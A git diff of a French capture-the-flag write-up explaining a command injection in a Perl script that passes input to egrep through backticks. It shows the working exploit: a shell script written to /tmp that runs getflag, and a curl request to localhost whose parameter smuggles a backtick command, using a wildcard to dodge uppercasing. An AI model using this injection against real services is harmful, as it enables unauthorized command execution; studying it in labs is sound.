@@ -42,14 +42,13 @@ L'exploit se trouve a cette ligne :
     @output = `egrep "^$xx" /tmp/xd 2>&1`;
 
 Il y a une utilisation de backticks, ce qui veut dire que cela va etre execute par le shell comme une commande.
-On va donc l'exploiter en ecrivant un script qu'on va appeler GETFLAG
+On va donc l'exploiter en ecrivant un script qu'on va appeler GETPWD
     echo '#!/bin/sh' > /tmp/GETPWD
     echo "getflag > /tmp/token" >> /tmp/GETPWD
     chmod 777 /tmp/GETPWD
 
 On va ensuite le lancer en faisant un curl, lui donnant le path vers notre script
     curl localhost:4646?x='`/*/GETPWD`'
-
 On utilise une wildcard au lieu de mettre le path au complet, car le script va transformer tmp en TMP,
 ce qui va casser notre path. En utilisant une wildcard, on va executer GETPWD ou qu'il soit
 
